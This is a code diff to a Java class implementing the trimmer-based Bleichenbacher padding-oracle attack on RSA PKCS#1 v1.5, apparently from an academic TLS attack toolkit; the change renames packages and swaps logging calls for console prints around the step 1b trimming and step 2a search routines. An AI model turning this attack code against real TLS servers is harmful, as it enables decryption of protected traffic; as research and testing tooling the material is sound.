@@ -1,9 +1,7 @@
-package de.rub.nds.ssl.analyzer.attacker;
+package de.rub.nds.ssl.attacker.bleichenbacher;
 
-import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.Interval;
-import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.OracleException;
-import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.oracles.AOracle;
-import de.rub.nds.ssl.stack.Utility;
+import de.rub.nds.ssl.attacker.bleichenbacher.oracles.AOracle;
+import de.rub.nds.ssl.attacker.misc.Utility;
 import java.math.BigInteger;
 import java.util.ArrayList;
 import java.util.LinkedList;
@@ -132,7 +130,7 @@ public class BleichenbacherCrypto12 extends Bleichenbacher {
     @Override
     protected void stepOneB() throws OracleException {
         byte[] send;
-        logger.info("Starting step 1b: Trimming");
+        System.out.println("Starting step 1b: Trimming");
 
         // Compute n/(9B)
         int _n_div_9B = publicKey.getModulus().divide(bigB.multiply(new BigInteger("9"))).intValue();
@@ -170,7 +168,7 @@ public class BleichenbacherCrypto12 extends Bleichenbacher {
 
             send = prepareMsg(c0, num, den);
             if (oracle.checkPKCSConformity(send)) {
-                logger.debug("   Aha! A valid padding with "
+                System.out.println("   Aha! A valid padding with "
                         + num.intValue() + "/" + den.intValue());
                 // Collect den that divides the plaintext
                 dens.add(den);
@@ -183,7 +181,7 @@ public class BleichenbacherCrypto12 extends Bleichenbacher {
             // Collect the used trimmer fi
             usedTrimmers.add(fi);
         }
-        logger.debug(" Fraction for lower bound: "
+        System.out.println(" Fraction for lower bound: "
                 + FracLower[0] + "/" + FracLower[1]);
 
         // Generate (initial) trimmers for upper bound
@@ -199,7 +197,7 @@ public class BleichenbacherCrypto12 extends Bleichenbacher {
             }
             send = prepareMsg(c0, num, den);
             if (oracle.checkPKCSConformity(send)) {
-                logger.debug("   Aha! A valid padding with "
+                System.out.println("   Aha! A valid padding with "
                         + num.intValue() + "/" + den.intValue());
                 // Collect den that divides the plaintext
                 dens.add(den);
@@ -212,25 +210,25 @@ public class BleichenbacherCrypto12 extends Bleichenbacher {
             // Collect the used trimmer fi
             usedTrimmers.add(fi);
         }
-        logger.debug(" Fraction for upper bound: "
+        System.out.println(" Fraction for upper bound: "
                 + FracUpper[0] + "/" + FracUpper[1]);
 
         // Compute the lcm of denominators
-        logger.debug(" Computing the lcm of denominators...");
+        System.out.println(" Computing the lcm of denominators...");
         lcm_real = lcm(dens, Integer.MAX_VALUE);
-        logger.debug("   lcm_real = " + lcm_real);
+        System.out.println("   lcm_real = " + lcm_real);
         lcm_dens_real = BigInteger.valueOf(lcm_real);
         BigInteger lcm_dens = getDenominator(dens, MAX_DENOS);
         maxdenominator = lcm_dens.intValue();
-        logger.debug("   lcm_dens = " + lcm_dens);
+        System.out.println("   lcm_dens = " + lcm_dens);
 
         // Compute the minimum/maximum numerators for the lcm of denominators
         if (lcm_dens.compareTo(BigInteger.ONE) > 0) { // if denominator >= 2 found
 
             // Generate candidates for the minimum numerator
-            logger.debug(" Start to find minimum numerator:");
+            System.out.println(" Start to find minimum numerator:");
             List<BigInteger> NumLower = getNumeratorL(lcm_dens, _E0, _F0m1);
-            logger.debug("   (from " + NumLower.get(0)
+            System.out.println("   (from " + NumLower.get(0)
                     + "/" + lcm_dens
                     + " to " + NumLower.get(NumLower.size() - 1)
                     + "/" + lcm_dens + ")");
@@ -256,7 +254,7 @@ public class BleichenbacherCrypto12 extends Bleichenbacher {
                     //System.out.println(" [" + num + ", " + lcm_dens + "]");
                     counter_frac++;
                     if (oracle.checkPKCSConformity(send)) {
-                        logger.debug("   Aha! A valid padding with "
+                        System.out.println("   Aha! A valid padding with "
                                 + num.intValue() + "/"
                                 + lcm_dens.intValue());
                         BigInteger[] newFracLower = updateFrac(FracLower, ni[0], ni[1]);
@@ -267,9 +265,9 @@ public class BleichenbacherCrypto12 extends Bleichenbacher {
             }
 
             // Generate candidates for the maximum numerator
-            logger.debug(" Start to find maximum numerator:");
+            System.out.println(" Start to find maximum numerator:");
             List<BigInteger> NumUpper = getNumeratorU(lcm_dens, _E0, _F0m1);
-            logger.debug("   (from " + NumUpper.get(0)
+            System.out.println("   (from " + NumUpper.get(0)
                     + "/" + lcm_dens
                     + " to " + NumUpper.get(NumUpper.size() - 1)
                     + "/" + lcm_dens + ")");
@@ -295,7 +293,7 @@ public class BleichenbacherCrypto12 extends Bleichenbacher {
                     //System.out.println(" [" + num + ", " + lcm_dens + "]");
                     counter_frac++;
                     if (oracle.checkPKCSConformity(send)) {
-                        logger.debug("   Aha! A valid padding with "
+                        System.out.println("   Aha! A valid padding with "
                                 + num.intValue() + "/"
                                 + lcm_dens.intValue());
                         BigInteger[] newFracUpper = updateFrac(FracUpper, ni[0], ni[1]);
@@ -308,11 +306,11 @@ public class BleichenbacherCrypto12 extends Bleichenbacher {
         }
 
         // Print the obtained fractions for lower and upper bounds
-        logger.debug(" Fraction for lower bound: "
+        System.out.println(" Fraction for lower bound: "
                 + FracLower[0] + "/" + FracLower[1]);
-        logger.debug(" Fraction for upper bound: "
+        System.out.println(" Fraction for upper bound: "
                 + FracUpper[0] + "/" + FracUpper[1]);
-        logger.debug(" counter_frac: " + counter_frac);
+        System.out.println(" counter_frac: " + counter_frac);
 
         // Update the initial interval by using the obtained fractions
         BigInteger[] new_m = updateM(m[0].lower, m[0].upper, FracLower, FracUpper, _E0, _F0m1, lcm_dens_real);
@@ -328,7 +326,7 @@ public class BleichenbacherCrypto12 extends Bleichenbacher {
         boolean pkcsConform = false;
         BigInteger n = publicKey.getModulus();
 
-        logger.info("Step 2a: Starting the search");
+        System.out.println("Step 2a: Starting the search");
         // si = ceil((n+2B)/upper)
         BigInteger tmp[] = (n.add(_2B)).divideAndRemainder(m[0].upper);
         if (BigInteger.ZERO.compareTo(tmp[1]) != 0) {
@@ -509,8 +507,8 @@ public class BleichenbacherCrypto12 extends Bleichenbacher {
             }
             k++;
         } while (trimmers.size() < numTrimmers / 2);
-        logger.debug("   loop num: " + k);
-        logger.debug("   length of trimmers: " + trimmers.size() + " last j: " + j);
+        System.out.println("   loop num: " + k);
+        System.out.println("   length of trimmers: " + trimmers.size() + " last j: " + j);
         return trimmers;
     }
 
